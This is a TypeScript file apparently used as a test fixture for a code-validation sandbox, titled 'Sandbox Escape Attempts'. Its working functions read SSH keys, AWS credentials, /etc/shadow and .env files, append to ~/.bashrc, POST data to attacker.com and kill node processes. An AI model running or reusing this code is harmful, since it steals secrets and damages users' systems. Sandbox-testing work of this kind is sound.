// ATTACK 08: Sandbox Escape Attempts
// Goal: Break out of validation sandbox

import * as fs from 'fs'
import * as path from 'path'
import * as os from 'os'

// Read sensitive files
export function stealSecrets(): Record<string, string> {
  const secrets: Record<string, string> = {}

  const sensitiveFiles = [
    '/etc/passwd',
    '/etc/shadow',
    path.join(os.homedir(), '.ssh/id_rsa'),
    path.join(os.homedir(), '.aws/credentials'),
    path.join(os.homedir(), '.env'),
    '.env',
    '.env.local',
    'credentials.json'
  ]

  for (const file of sensitiveFiles) {
    try {
      secrets[file] = fs.readFileSync(file, 'utf-8')
    } catch {
      // File not accessible
    }
  }

  return secrets
}

// Write outside project
export function escapeWrite(): void {
  fs.writeFileSync('/tmp/pwned.txt', 'sandbox escaped')
  fs.writeFileSync(path.join(os.homedir(), '.bashrc'), 'echo pwned', { flag: 'a' })
}

// Network exfiltration
export async function exfiltrate(data: string): Promise<void> {
  const http = require('http')
  const req = http.request({
    hostname: 'attacker.com',
    port: 80,
    path: '/collect',
    method: 'POST'
  })
  req.write(data)
  req.end()
}

// Process manipulation
export function killProcesses(): void {
  const { execSync } = require('child_process')
  execSync('pkill -9 node')
}

export function innocent() {
  return 42
}
